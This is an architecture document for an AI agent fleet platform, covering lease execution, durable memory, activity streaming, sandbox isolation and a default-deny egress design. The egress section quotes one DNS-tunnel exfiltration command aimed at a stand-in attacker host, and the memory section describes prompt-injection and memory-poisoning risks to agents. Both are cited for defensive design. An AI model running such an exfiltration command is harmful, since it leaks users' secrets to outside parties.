1. **The runner never authenticates to Postgres.** It holds zero datastore credentials and reaches the platform only over `/v1/runners`. `agentsfleetd` writes every `fleet.*` row *on the runner's behalf*, connecting as `api_runtime`. Schema files `021`/`022`/`023` grant the fleet tables to `api_runtime` only — the newest tables in the system never even mention `worker_runtime`, which is dead substrate removed wholesale in the worker-substrate retirement workstream.
2. **`runner:enroll` is not a Postgres role — it is a token scope.** "whoever may enroll has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1 (it gates `register` and the fleet-management routes). It is not, and must not become, a database `GRANT`.
3. **Therefore there is no `runner_runtime` role, and there must never be one.** A `runner_*`-named datastore role would assert that the runner connects to the datastore — exactly the guarantee this fleet is built to deny. (An in-PR `worker_runtime`→`runner_runtime` rename was rejected for this reason; removal, not rename, is the correct direction.)

If connection-level isolation of the fleet write path is ever warranted, that is a **control-plane** role — name it `fleet_runtime`, back it with its own pool, and justify it with a real threat model that treats the fleet writes as a distinct compromise surface. It is never a runner-named role, and it stays out of scope while `agentsfleetd` runs a single write pool: a second role with no second pool or code path is the dead-role anti-pattern the role-consolidation work exists to eliminate.

## Running one event

A `lease` reply is the runner's entire input for an event. The runner runs the event's turn and sends the result back with `report`. [Runner execution](./runner_execution.md) §"One lease, end to end" walks the runner's side.

```
lease → { event, ExecutionPolicy, instructions }  (full shape: API reference › Runner plane)
   (`instructions` = the `instructions_md` of the fleet's selected setup revision,
    read by the claim (`afd_fleet/src/lease/installed.rs`); the agent loop builds the system
    prompt from it so the reviewed behaviour runs on every trigger. Soft reasoning input,
    never a secret: the provider key and secrets_map stay in ExecutionPolicy and the
    supervisor.)
   │
agentsfleet-runner supervisor: admit the policy, take the fleet's turn, hydrate memory;
   when a tool runs in a sandbox, take the fleet's held sandbox or build one and check
   the bound repositories out
   │
   └─ agent loop (in the supervisor): model calls with the lease's key; each tool call
      runs where its runtime says, in the supervisor or through the sandbox's executor
   │
report → agentsfleetd: one transaction (settle + terminal state + checkpoint
         + freed slot + the OWED DELIVERY), then — after it commits — the
         activity frame and the answer onto connector:outbound
```

The admission settlement, usage, terminal event, checkpoint, slot release and outbound obligation commit together.
A failed transaction leaves the lease active and unsettled. A lost response is retried against the stored outcome without another charge.

Activity publication and outbound dispatch follow the commit. See [`data_flow.md`](./data_flow.md) §"C. EXECUTE".

The durable lease guard lives in `agentsfleetd` via `lease_expires_at` + `fencing_token` (see **Reclaim** below). On the runner, each lease is one task that owns its sandbox: a sandbox is held or destroyed exactly once, and the engine's boot sweep removes what a crashed runner left ([Runner execution](./runner_execution.md) §"A lease's sandbox today").

### Process-boundary hardening

bubblewrap, Landlock, seccomp, the lease's cgroup and the process boundary under them are [runner_execution.md](./runner_execution.md) §"Sandbox engines". Network egress is the orthogonal layer (§Egress model).

### Multi-run events

One lease is one run. [Conversation compaction](context_lifecycle.md) saves working notes and continues within that lease, retaining tool access.
A report's outcome is `processed` or `fleet_error`; context pressure does not request another lease (`rustd/crates/afd_wire/src/report/mod.rs`).

A continuation event still exists, chained by `resumes_event_id`: an approval's answer writes one, and the next lease runs it (`rustd/crates/afd_approval/src/inbox/resolve/mod.rs`). Durable state across runs is in `agentsfleetd`, never runner-local, which is why any runner can take the next event. Sticky routing (below) prefers the runner that ran the previous one, but correctness never depends on it.

## Memory continuity — durable fleet memory rides the trusted plane

Memory is the second kind of cross-run state, under the same law as the checkpoint: **durable fleet memory lives only behind `agentsfleetd` — never in the runner, never in the fleet.** The runner reaches it through `agentsfleetd`'s runner API alone and holds no credential for any store; Postgres is the only store built: `afd_memory::PgStore`, behind `afd_memory::Memories` (§"Memory backends and scope"). The checkpoint records the last event and answer; it is saved, and no lease carries it yet ([Runner execution](./runner_execution.md) §"Workspace between leases"). Memory carries the fleet's learned knowledge: the `memory_store` / `memory_recall` durable scratchpad. It is hydrated into a run and captured out of it, and is never runner-local-durable.

The memory tools run in the supervisor, so a sandbox holds **no** `agt_r` token, **no** control-plane URL, **no** Data Source Name (DSN) and no memory: a prompt-injected fleet cannot be talked into "reach your memory endpoint", because none exists inside it. The run's working store is `afr_memory::Hydrated`, in the supervisor's memory, with no on-disk file. Durability is the supervisor's job, over the same `agt_r` `/v1/runners` plane that already carries leases and reports. Two fencing-verified routes carry it, hydrate and capture under `/v1/runners/me/memory/{fleet_id}`, plus a capped recall (API reference › Runner plane). Capture writes under `SET ROLE memory_runtime` ([memory.md](./memory.md) §"2. Isolation — a Postgres role, not the workspace").

```
        ┌───────────────────────────────────────────────────────────────┐
        │  Postgres · memory.entries         ← ONLY durable store       │
        │  written under SET ROLE memory_runtime (datastore role)       │
        └───────────────────────────────────────────────────────────────┘
          GET /v1/runners/me/memory/{id}   POST /v1/runners/me/memory/{id}
          (hydrate prior memory)         (capture run memory)
          [agt_r + fencing]               [agt_r + fencing]
                   │                             │
        ┌─────────────────────────────────────────────────────────────┐
        │  agentsfleet-runner SUPERVISOR (trusted): holds the agt_r   │
        │  the agent loop and the memory tools run here;              │
        │  in-run store = afr_memory::Hydrated (no disk file)         │
        │  fleet calls memory_recall() / memory_store()               │
        └─────────────────────────────────────────────────────────────┘
            executor socket ↓ tool calls only
        ╔═════════════════════════════════════════════════════════════╗
        ║  sandbox: tool calls only; NO token, URL, DSN or memory     ║  ← SANDBOX BOUNDARY
        ╚═════════════════════════════════════════════════════════════╝
```

**The carry-over — one fleet, two runs:**

```
RUN 1  (first ever for fleet A)
  lease{ fleet=A, fence=7 } → runner supervisor
  supervisor ─GET /me/memory─►  []             (empty: nothing stored yet)
  supervisor seeds the run's EMPTY store
  fleet:  memory_store("todo", "step 3 of 5"),  memory_store("prefs", …)
  run-end  +  every memory_checkpoint_every:
     the run's store → deltas
     supervisor ─POST /me/memory─►  agentsfleetd INSERTs rows   (fleet_id = A)
  run ends → the run's store is dropped (no disk file)

  Postgres now holds:   A · todo · "step 3 of 5"    |    A · prefs · …

RUN 2  (next run, same fleet A)                          ◄── THE CARRY-OVER
  lease{ fleet=A, fence=8 } → runner supervisor
  supervisor ─GET /me/memory─►  [todo, prefs]  (run 1's memory)
  supervisor seeds the run's store WITH those entries
  fleet:  memory_recall("todo") → "step 3 of 5"   → continues from step 3
          memory_store("todo", "step 5 of 5")     (same key → UPDATE)
  push → agentsfleetd UPDATEs (todo, A) + INSERTs any new keys (idempotent)
```

**Data model.** Scope, isolation, and durability are canonical in [`memory.md`](./memory.md) §1–§2 and are not restated here. The one fact this transport owns: the `fleet_id` a push is scoped to is **derived server-side from the lease `agentsfleetd` issued**, so a client-supplied scope is ignored. The upsert is idempotent, which is why a retried push is safe.

**Multi-lease isolation invariant.** Concurrent-lease safety (M88_002's worker pool) rests on the per-fleet **affinity slot admitting a single live holder** — `runner.fleet_slots` keyed by its `fleet_id` primary key + the `lease_expires_at < now` time-gate — plus **capture-time `fencing_token`** rejecting a stale holder. (It is *not* a unique constraint on `runner.leases`. Multiple lease rows per fleet are normal, and a slow old holder can transiently coexist with a reclaimer. That is why fencing exists: only one writer durably persists into a fleet's namespace.) So a runner's N concurrent leases are always N *distinct* fleets, which means N distinct namespaces. Isolation does **not** rest on `fleet_id` scoping alone: a future retry / speculative / failover / takeover-lease feature that broke the single-live-holder property would have to scope memory by `lease_id` first. Keep this invariant load-bearing. A held sandbox ([Runner Execution](./runner_execution.md) §"Workspace between leases") keeps it: the hold gives its runner a head start at the slot, never the slot, and the holder claims through the same fencing-guarded statement. The decided workspace scope (§"Memory backends and scope") gives one workspace key many live writers by design, so its fencing token will prove a live lease, not a sole writer; the memory work defines how concurrent writes to one key resolve.

**Cadence.** The supervisor pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence, so a long run's learned memory is durable before the run finishes — a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run hydrates the snapshot the previous run just stored.

**Selection policy.** Hydration is a deterministic, category-pinned byte window — a pure function of (rows, budget). The `core` tier is pinned: every `core` entry, newest-first, within the byte budget. The newest non-core entries fill the remainder. Unknown and custom categories are windowed, never silently pinned. Cap eviction orders the same way — the coldest non-core rows are evicted first, and a `core` row is evicted only when no non-core row remains — so a fact stored once as `core` survives both the window and the cap. No search infrastructure, no scoring: the fleet's own discipline (stable keys, `core` for load-bearing facts, `memory_forget` for stale entries — see [*capabilities.md*](./capabilities.md) §4 memory hygiene) is the primary bound. A dedicated, scalable memory store remains the post-launch direction; the `GET` endpoint is the seam it swaps in behind, with no change to the fleet.

### Memory backends and scope (decided 2026-10-03; built)

Two decisions by Indy on 2026-10-03, after the options below were weighed.

1. **The runner reaches memory only through `agentsfleetd`'s runner API, whatever store holds it** ("Always via agentsfleetd"). Stores sit behind one trait inside `agentsfleetd`: Postgres by default; turbopuffer, mem0 or another later. A workspace's store is flipped in `agentsfleetd`, and a flip migrates the workspace's memory to the new store before it takes effect. The runner holds no credential for any store. This replaced option C, which Indy chose earlier the same day ("C: hybrid"), before the flip-with-migration requirement arrived. The flip shipped in M210_004 with no caller and was removed in M229 (Indy, 2026-10-18): no endpoint called it and no second store existed, so the trait, the flip and the in-memory store it was proved against come back with the first vendor store.
2. **Memory carries both keys.** Every entry belongs to a workspace; a fleet-scoped entry also belongs to its fleet. A fleet reads and writes its own fleet-scoped memory as today. Workspace-scoped memory is shared by the workspace's fleets and reached only by a fleet granted that access. Indy: "we must have flexibility to have the memory have a key of the fleet_id, workspace_id as well. The workspace_id are restricted based on scope (access control)", refining an earlier "Workspace-wide only". A per-channel resident fleet keeps its channel's memory private by staying fleet-scoped.

| Option weighed | Who talks to the store | Credential the runner holds | `agentsfleetd` calls per run |
|---|---|---|---|
| A · through `agentsfleetd` (chosen) | `agentsfleetd` | none | hydrate and push, plus a capped number for recalls the hydrated window misses |
| B · runner direct | the runner | a long-lived store key on every lease | none for a vendor |
| C · hybrid (chosen first, replaced) | the runner | a short-lived key scoped to one namespace | one mint per lease for a vendor |

```
runner ── GET/POST /v1/runners/me/memory ──► agentsfleetd ── store trait ──┬─ Postgres (default)
  the memory tools read the hydrated           flip + migration per          ├─ turbopuffer
  window; a miss asks agentsfleetd,            workspace; fleet and          └─ mem0, …
  a capped number of times per run             workspace scopes; access
                                               control on the workspace scope
```

**Why through `agentsfleetd`.** A flip that migrates memory means `agentsfleetd` reads and writes every store anyway. With one owner, the two scopes, the access control on the workspace scope and the record of which fleet wrote an entry hold the same on every store, whatever a vendor's keys can scope, and the runner keeps holding no store credential. A run still costs one hydrate and one push; a recall the window misses adds a capped number of calls.

**Accepted risks.** Shared memory lets a private channel's facts reach other fleets, and lets a fleet reading untrusted input plant a "fact" that a fleet holding a write token trusts. Both now pass only through workspace-scoped memory, which only granted fleets reach, and the recorded writer keeps every shared entry traceable.

**Built.** Every memory read and write in `agentsfleetd` goes through `afd_memory::Memories`, held once by the daemon, which reads each fleet's workspace and grants from `fleet.fleets`, applies them, and calls the Postgres store, `afd_memory::PgStore`. Every entry keeps its writer fleet in its identity, `(workspace_id, fleet_id, key)`, and carries `workspace_visible` (slot 2100). Access is a workspace setting with read and publish granted apart: `memory_reads_workspace` and `memory_publishes_workspace` on `fleet.fleets` (slot 927), set by `PATCH …/fleets/{fleet_id}/memory-access` under `fleet:write`. A granted reader's hydrate carries other fleets' shared entries, each naming its writer, within `HYDRATE_SHARED_BYTES` after its own window; a share from a fleet without publish is refused by the `memory_store` tool and skipped and counted at the push. A recall the window cannot fill asks `POST /v1/runners/me/memory/{fleet_id}/recall`, at most `RECALL_MISS_CAP` times per run. Concurrent writers to one key do not arise: the writer is in the key, so two fleets sharing one key hold two entries.

**Still open for the memory work.** Whether `direction.md`'s no-search rule is reversed for a search-capable store, and which vendor goes first. That store brings the store trait, the flip that migrates a workspace onto it, and the endpoint that calls the flip, together. The trait must then carry a fleet purge, which today deletes its rows in Postgres directly. M210_004's Discovery records the two write-during-flip races its removed flip left open, for whoever rebuilds it.

## Live activity (the SSE tail)

The agent loop emits progress frames mid-run: tool started, tool completed, and each answer chunk. The runner holds no Dragonfly, so the supervisor hands each frame to a per-lease sink that never blocks the run, and a pump batches frames up to 64 KiB, flushing every 250 ms. At most four batches are queued or in flight; past that the next batch waits with the batcher and keeps filling, and only a batch that filled while it waited is dropped, counted and logged as `activity_batch_dropped`. A post that fails loses its batch, logs `activity_frame_write_failed` and counts its frames as dropped (`rustd/crates/afr_supervisor/src/activity/mod.rs`). `afd_fleet`'s activity path publishes the ordered batch on the `fleet:{id}:activity` channel `afd_sse` names. The hub shares one Dragonfly subscription connection across downstream Server-Sent Events (SSE) viewers.

```
agent loop ─sink─► activity pump ─POST .../activity (no ack)─► agentsfleetd ─SPUBLISH─► SSE
```

The runner's frames reach the channel through `afd_fleet::lease::activity`, each stamped with the `event_id` its lease runs: `tool_call_started`, `tool_call_progress`, `tool_call_completed` and `chunk`. Frame kinds and fields: API reference › Fleet events (Stream live fleet activity).

The runner fills these from each call it executes. Arguments are serialized with every string leaf scrubbed of the redaction set and of known secret patterns first, so `args_redacted` is always valid JSON (at most 2 KiB) and a secret holding a quote or backslash cannot slip past the substring match. Each output edge is at most 1 KiB, cut on a UTF-8 boundary, with invalid UTF-8 replaced and control and bidirectional characters removed, then scrubbed the same way, so a binary response body cannot make the daemon refuse a batch. A completed frame from an older runner carries no outcome, and a reader treats that as unknown, not failed. How the runner captures a call is [Runner execution](./runner_execution.md)'s subject.

Every call ends exactly once. When a run ends for any reason, the runner emits `tool_call_completed` with `status: interrupted` for each call still open, so a crash, kill or timeout never leaves a call running in a browser or missing from the record. The run's trace — up to 200 calls and 64 KiB; past the byte cap a call keeps its row without output edges, and past 200 calls it is counted as omitted — rides the report. `agentsfleetd` parses it after the report's own fields, checks its bounds, rewrites each call id to the fenced `{fence}:{n}` the live frames use, and writes it to `fleet.events.tool_calls` in the statement that writes the reply, so a fenced-out report writes neither. A trace that is malformed or over a bound is dropped and logged, and the report still settles, because the run's outcome must not be lost over its tool list.

Each call's full arguments and output (up to 64 KiB each, 1 MiB per run, under the same scrub) ride neither the live tail nor the report. The runner posts them in batches of at most 256 KiB to `POST /v1/runners/me/leases/{lease_id}/tool-calls` under the lease's fencing token, before the report, which keeps the report far below the runner routes' 2 MB request limit (axum's default; `afd_api/src/router/mount.rs` sets no other). The daemon stores them in `fleet.tool_calls`, a child table of `fleet.events`, keyed by fence and call number, and settlement deletes the event's rows from every other fence, because a reclaimed lease restarts its call numbers at 1. A failed post costs only the full view; the run settles as before.

`call_id` is the runner's own counter for the run, minted when a call starts and repeated on each of its frames (`rustd/crates/afr_agent/src/ledger/mod.rs`). The daemon accepts `call_id` as optional and bounded by `CALL_ID_MAX_BYTES`, and publishes it as `{fence}:{call_id}` under the lease's fencing token: a reclaimed lease re-runs the same event from a fresh runner whose counter restarts at 1, and the fence keeps its calls apart from the dead lease's. The activity structs refuse unknown fields, so a runner sending `call_id` needs a daemon that reads it; both ship in one release, and the release workflow deploys the Fly daemons before the metal runners (`deploy-metal-canary-prod` needs `deploy-fly-prod`). The outcome fields and the report's `tool_calls` follow the same order, with a sharper edge: an older daemon refuses a whole report that carries `tool_calls`, so rolling the daemon back below the release that added it needs the runners rolled back first. The sandbox hold adds two more fields with the same edge: an older daemon refuses a report that carries `held_until`, and reads every heartbeat that carries `holds` as no report at all, dropping its capability report with it. So the daemon ships before its runners, and rolls back after them. A browser pairs a call's frames by `call_id`; a frame from an older runner has none and pairs by name and timing.

Two planes, kept apart on purpose: **activity** is ephemeral and best-effort (a dropped frame is cosmetic); **report** is the durable system of record. The live tail is never the source of truth. The runner reports the durable outcome before waiting for its activity sender to drain, so a cold activity connection cannot delay settlement; a late activity frame may arrive after completion. A cold DNS or TCP connect still precedes the sender's socket deadline and can hold a worker at the post-report join. Runner chunks carry a pass start marker, contiguous-delivery flag, and sequence number. The browser rejects a gap, ignores activity after completion, and reads the durable event detail to settle the final answer. Its reply decoder uses Hermes protocol parsing and incremental HTML tokenization to keep reasoning and tool protocol out of the visible answer; after the first visible delta, it batches display updates at a 50 ms interval. The bracket frames are published by `agentsfleetd` itself (`afd_fleet::lease::bracket`, shapes in `afd_api_wire::tail::TailFrame`), so the tail has open/close markers even before the runner forwards a single mid-run frame. The bracket frames are `event_received` (when the lease verb or an approval's resolve writes the row), `event_complete` (when a report or a gate refusal closes it), and `gate_opened` / `gate_resolved`. Each carries what a watcher needs to fold it in without a read: `event_complete` is the terminal row from the closing statement's `RETURNING`, and the gate frames carry `pending_approvals` from the statement that moved the gate. Frame kinds and fields: API reference › Fleet events (Stream live fleet activity).

Every daemon frame also carries the fleet's activity counters as an absolute snapshot, so the wall's tiles assign rather than add. The closing statement reads them beside the row it ends; every other publisher reads them once, by primary key off `fleet.activity_counters`, right before its publish (`afd_events::fleet_counters_best_effort`). The opening bracket must read after its insert, because that insert is what fires the counter trigger and a `RETURNING` on it cannot see the trigger's write. The read is best-effort like the publish: a read that does not answer sends the frame with the counters absent — which a client reads as "leave what you have standing" — never with zeros, which it would read as a fleet that has done nothing. A publisher whose own write moved the counters — the receive, the continuation, the park, the resolve — reads on the connection that write held, so the hot path pays one statement and no second acquire; the sweep reads once per distinct fleet. Both counters only grow, so a client keeps the GREATER of what it holds and what a frame carries, which is what makes a frame that crossed a `hello` in flight harmless. A `catching_up` is followed by a fresh `hello`: the dropped frames are exactly the ones that moved the counters, so the backfill recovers the rows and the greeting recovers the figures. The workspace `hello` reads its map by `workspace_id` and `ANY(fleet ids)`, uncached, only when a greeting goes out.

No daemon frame names its fleet or workspace: the tail is one fleet's channel, and the workspace multiplex splices `fleet_id` in as the one leading key of every frame it forwards (`afd_sse::Frame::tagged`). Every bracket and gate publish goes through `afd_dragonfly::FleetStreams::publish_frame` and is best-effort like the runner's frames: the row is written first, the frame announces it, and reconnect backfill recovers durable event rows from the events list. A missed publish alone does not trigger that backfill.

The dashboard opens streams through authenticated, same-origin Next.js `/live/*` proxies.
The daemon serves asynchronous response bodies through the shared hub, with a separate stream admission ceiling.
[Data Flow, D. WATCH](./data_flow.md#d-watch--user-side-how-the-live-tail-surfaces) owns authentication, recovery limits, and the per-hop HTTP topology.

## Steer, kill, pause

All three are decided by `agentsfleetd`, which owns both `fleet.fleets.status` and lease issuance. None cancels a lease already running: the heartbeat answers `ok` and names no lease. Renewal reads the fleet's stored config whatever its status, so a paused or killed fleet's run still stops at the fleet's stored budget ceiling (`rustd/crates/afd_fleet/src/lease/coverage.rs`). Each renewal reads that ceiling afresh: a paused or stopped fleet's config can be edited mid-run and the next renewal obeys the edit; a killed fleet's cannot be edited.

- **Steer** — a human message. `agentsfleetd` enqueues a `steer` event; it is leased like any other. The current run finishes first; the steer runs next. Not an interrupt.
- **Pause** — `agentsfleetd` sets `status=paused` and stops issuing leases for the fleet. A lease in flight runs on as under Kill, below: to its own end, its fleet's budget ceiling, or `MAX_RUNTIME`.
- **Kill** — `PATCH /v1/workspaces/{workspace_id}/fleets/{fleet_id}` with `status: killed` sets `status=killed` and stops issuing leases for the fleet. It writes nothing to `runner.leases` (`rustd/crates/afd_fleet_lifecycle/src/sql/mod.rs`), so a lease in flight runs to its own end, its fleet's budget ceiling, or `MAX_RUNTIME`, and its report settles like any other.

No cancel channel exists: a revocation carried on the heartbeat, or a dedicated low-latency channel, is unbuilt.

## Cold and warm execution

A lease runs in a fresh sandbox or its fleet's held sandbox. A lease that fails, is interrupted or is superseded tears its sandbox down.

The Rust runner's per-lease sandbox, its measured cold start and where its bytes live are in [Runner execution](./runner_execution.md) §"A lease's sandbox today"; a lease whose tools all run in the supervisor starts no sandbox at all.

A lease that ends **processed** leaves its sandbox **held** for the same fleet. The frozen sandbox keeps its workspace files for ten idle minutes ([Workspace between leases](./runner_execution.md#workspace-between-leases)). The fleet's next lease can continue in it.

Every lease carries fresh config and secrets; config is never cached. A hold whose limits or policy changed is destroyed. Sticky routing remains a hint.

The report writes `runner.fleet_slots.hold_expires_at` during its fencing-guarded release, clamped to that window. Every heartbeat lists the fleets the runner still holds. It clears holds missing from the list, except those reported within the last beat interval.

A `closing` heartbeat also clears those recently reported holds because the runner's list is final. The heartbeat response names holds whose fleet became inactive or was leased elsewhere. An unreadable, out-of-bounds or empty list holds nothing.

The lease poll carries the same list. The holder checks those fleets before its ledger candidate scan. Both the candidate scan and claim skip a fleet held by another eligible runner with an unexpired hold.

Eligibility requires that holder to be active, not degraded, and seen within `RUNNER_OFFLINE_AFTER`. Another runner's claim clears `hold_expires_at`; the holder's own claim keeps it.

`resume_hold` requires the slot's last lease to have run on that runner, an unexpired hold, and an event that is not a reclaim. Other holds may predate another runner's run or this event's first attempt. Otherwise any eligible runner takes the event in a fresh sandbox, without waiting for a particular runner.

## Config

A Fleet's config (model, tool allowlist, network policy, context budget, gate rules, trigger settings, secret references) is the `config` member of its selected setup revision in `fleet.revisions`, validated by `afd_fleet_runtime::Definition` (`afd_fleet_runtime/src/definition/mod.rs`). The claim reads it from that revision (`afd_fleet/src/lease/installed.rs`). A reviewed improvement (`POST /v1/workspaces/{ws}/fleets/{id}/revisions`, N11 in [`api_resources.md`](./api_resources.md)) appends a new revision and selects it; `PATCH` on the fleet changes only its status and name.

`agentsfleetd` resolves config fresh from Postgres on every `lease`, so config changes take effect on the **next command** (the next lease) with no signaling. There is no in-memory config cache and no `fleet_config_changed` consumer to wait on — the deleted worker's watcher-reload path is gone. A config change never alters a language-model turn already in flight; the next run picks it up.

## Money gates

The gates run before the lease is issued and charge nothing; the issued lease's hold is reserved, each `/renew` and the report log the slice's usage for the biller to settle, and an uncovered renewal is refused `UZ-RUN-012` ([billing_and_provider_keys.md](./billing_and_provider_keys.md) §"3. One debit point: usage, settled through the biller").

## Datastore topology

PostgreSQL owns the inbound admissions queue. Dragonfly carries activity, wake notifications, session state and outbound delivery.
The [datastore design](./datastore_scaling.md#the-admissions-ledger-is-the-queue) owns the queue predicate, limits and failure rules.

A claim takes the fleet slot before its exact oldest unsettled admission. Both fences advance in one transaction.

Locked or parked heads cannot expose later admissions. A gate answer clears the park stamp and publishes a best-effort wake.

The candidate query prefers held fleets and a recent wake hint, then the runner's previous fleet, with random ordering for the rest.
It checks runner labels and live sandbox holds before attempting a claim. Every poll probes PostgreSQL; missing notifications cannot hide accepted work.

## Sandbox tiers

The control plane ASSIGNS a tier to each runner row (Add Runner / the fleet PATCH) and delivers it with the runner's identity on enrollment and every heartbeat. The host probes what its kernel can enforce and reports that upward. A host whose report cannot satisfy its assignment is marked degraded and issued no work (§Assigned policy and reconciliation). The capability report stays unauthenticated self-assertion, so trust for placement remains operator-assigned, not host-claimed. Only tiers with real enforcement are assignable (`rustd/crates/afd_wire/src/runner/mod.rs`).

| `sandbox_tier` | Where | What the daemon demands of the report |
|---|---|---|
| `landlock_full` | Linux host | Landlock, seccomp, bubblewrap and every required cgroup controller |
| `container_nested` | runner inside a container on a Linux host or VM (Virtual Machine) | the same set: the sandbox applies Landlock on every tier |
| `dev_none` | development | nothing; a policy other than `allow_all` reads degraded under it, because only a sandbox enforces one |

The runner builds the same bubblewrap sandbox under every tier, and a host that cannot build one refuses `run` at boot ([Runner execution](./runner_execution.md) §"Sandbox engines"). The tier labels the self-test and sets what the daemon's reconcile demands (`rustd/crates/afd_runner/src/reconcile.rs`). On a Mac, `agentsfleet-runner` runs inside a Linux VM (Docker Desktop / OrbStack / Lima); there is no macOS engine.

> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (file system / system call / process) — it is **orthogonal** to network egress. Landlock governs the file system; its network support is TCP *port* binding and connecting only, not host allowlisting. So no tier substitutes for the egress model below.

## The sandbox filesystem contract

A sandbox sees a mount namespace bubblewrap builds from a fixed set, in one order (`rustd/crates/afr_sandbox/src/bubblewrap/mod.rs`):

| Inside | From | Mode |
|---|---|---|
| `/` | the admitted toolbox image's mount | read-only |
| `/proc`, `/dev` | a fresh `/proc` for the sandbox's process namespace, a minimal device tree | as bubblewrap mounts them |
| `/dev/shm` | a private tmpfs, a quarter of the lease's memory | read-write, `1777` |
| `/tmp` | the workspace disk's `tmp/` directory | read-write |
| `/run` | a private tmpfs | read-write |
| `/workspace` | the workspace disk's `workspace/` directory | read-write |
| `/run/agentsfleet` | the lease's socket directory | read-write, owned by the sandbox user |
| `/opt/agentsfleet/agentsfleet-runner` | the runner binary | read-only |
| `/etc/hosts`, `/etc/resolv.conf` | the lease's rendered resolver files, under `allow_list_egress` only | read-only |
| `/etc/hosts`, `/etc/resolv.conf` | the host's own files, under `allow_all` only; a file the host lacks stays the image's | read-only |

Everything else a lease reads, `/etc` and the certificate store included, comes from the toolbox image, so no host file reaches a sandbox unless this table names it. Landlock then narrows writes to `/workspace`, `/tmp`, `/dev/pts` and `/dev/shm`, plus the single devices a shell opens: `/dev/null`, `/dev/zero`, `/dev/full`, `/dev/tty` and `/dev/ptmx` (`rustd/crates/afr_sandbox/src/harden/mod.rs`).

The assigned policy carries an operator list of extra binds, each with a mode and a note. The daemon validates and stores it, and the dashboard refuses an entry that overlaps a protected path. The runner binds none of them, so the table above names every host path a sandbox mounts.

The table covers the file system alone. Under `allow_all` the sandbox also shares the host's network namespace (§Egress model).

## Egress model — outbound is the only network surface

The runner box is **outbound-only**: it runs no inbound listener (the supervisor dials the control plane over HTTPS; see §Datastore role model) and holds no co-located datastore. No model key or minted token enters a sandbox, so the network threat from a sandbox is a tenant program sending the workspace's contents, or anything it computes, somewhere it should not, or reaching an internal address.

Three network policies, assigned per runner (`rustd/crates/afd_wire/src/runner/mod.rs`):

- **`allow_all`** — bubblewrap is not given `--unshare-net`, so the sandbox stays in the host's network namespace and all outbound egress is allowed (`rustd/crates/afr_sandbox/src/bubblewrap/mod.rs`).
- **`deny_all_egress`** — the sandbox's own network namespace, with loopback only; it reaches nothing. A missing assignment gets the same, because a runner never opens egress on missing input.
- **`allow_list_egress` (enforced allowlist)** — the sandbox keeps its **own** network namespace, joined to the host by one **veth pair**, `afv<slot>`, point-to-point `10.69.<slot>.0/30` (host `.1`, sandbox `.2`), slot `0..=253`. The runner installs **default-deny nf_tables rules in the host namespace**, on the host side of the pair. They are owned by root and never live inside the sandbox's namespace, so `nft flush ruleset` inside it changes nothing. Egress is permitted only to the IPv4 set resolved at lease bind. Traffic to any other address is dropped at the kernel, a raw address included, but the set matches addresses alone (residuals below). A host the fleet names never brings a private or reserved address into the set; the lease is refused instead, as the fail-closed rules below say.

**One table per sandbox, scoped to its link.** The table is `inet afegress<slot>`, built over netlink from Rust, never through the `nft` or `ip` binaries. It holds the set of allowed addresses and three chains:

| Chain | Hook | Rules, every one scoped to `afv<slot>` |
|---|---|---|
| forward | forward, policy accept | from the sandbox: drop TCP and UDP port 53, accept the set, drop the rest; to the sandbox: accept established and related traffic, drop the rest |
| input | input, policy accept | drop anything arriving from the sandbox's link |
| postrouting | postrouting, network address translation | masquerade the `/30` out of any other interface |

Every base chain accepts by policy and drops only on its own link, so one sandbox's table never touches another sandbox's or the host's forwarded traffic. The deleted runner's design differed here: each worker's table had a forward chain with `policy drop`, which dropped every other worker's and the host's forwarded packets.

**The merged sandbox allowlist.** At lease bind, the supervisor starts with the runner's assigned `registry_allowlist` or, when empty, the default registry set. It then appends the fleet's `network.allow`, deduplicating in first-seen order.

The default registries are `registry.npmjs.org`, `pypi.org`, `files.pythonhosted.org`, `static.crates.io`, `crates.io`, `index.crates.io`, `proxy.golang.org` and `sum.golang.org`.

A fleet with `read_only` keeps its hosts out of the kernel set. Kernel rules cannot enforce HTTP methods; those destinations remain available through guarded HTTP tools.

Each entry is read as a URL's host, using `https://` when no scheme is present. A scheme, port or path is dropped; `[::1]:80` names `::1`.

HTTP tools parse additional domains with the same helper, `afr_egress::allowlist_host`. The supervisor resolves sandbox names to IPv4 with the host resolver.

**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox, at the base URL saved for the selected model ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.

**Name resolution is supervisor-provided; there is no reachable resolver.** The supervisor renders a static `/etc/hosts`, each allowlist name with its resolved address, and an `/etc/resolv.conf` naming no server, both bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable. That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.

**Fail-closed and IPv4 only.** A name that does not resolve, or resolves to IPv6 alone, a set over 256 addresses, and any netlink failure each refuse the lease, and the refusal names its reason. So does a host from the fleet's `network.allow` that resolves to any address `afd_core::net::is_blocked` refuses: loopback, the private ranges, the tailnet's shared range `100.64.0.0/10`, link-local with the cloud metadata service `169.254.169.254`, and everything reserved. That is the predicate `http_request` and the daemon's endpoint check use, so a host refused at the request layer is refused at the kernel too. The lease ends with "the fleet allows an egress host at a private or reserved address", the fleet owner's to fix; the log names the host, never the address. Registry hosts are exempt: the operator may point them at a mirror on its own network. IPv6 egress is out of scope.

A scope that fails to build is torn down with its sandbox, and the lease is refused. The sandbox starts in a namespace holding only loopback. `prepare` returns it only after `join` builds its scope, so no tool call reaches it before its rules exist (`rustd/crates/afr_sandbox/src/bubblewrap_engine/mod.rs`).

**Lifecycle.** The scope is built with the sandbox, before the lease runs, and removed with it. A held sandbox is reused only when the runner's egress, its policy and its resolved set, is unchanged ([Runner execution](./runner_execution.md) §"Workspace between leases"). Building the engine sweeps every `afegress*` table and `afv*` link a crashed run left, before the first lease.

